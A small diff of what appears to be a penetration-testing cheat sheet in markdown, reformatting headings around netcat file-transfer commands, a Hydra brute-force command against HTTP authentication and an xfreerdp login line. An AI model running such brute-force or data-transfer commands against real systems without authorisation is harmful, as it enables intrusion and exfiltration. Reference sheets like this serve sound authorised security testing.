@@ -48,14 +48,14 @@ nc -l -p 1234 > out.file
 nc -w 3 [destination] 1234 < out.file
 ```
 
-Hydra:</br>
+#### Hydra:
 http-auth bute force
 
 ```
 hydra -L user.txt -P password.txt -t12 -f x.x.x.x http-get / -V
 ```
 
-XfreeRDP:
+#### XfreeRDP:
 
 ```
 xfreerdp /f +clipboard /kbd:0x0000040C /u:USERNAME@DOMAIN /p:PASSWORD /v:IP
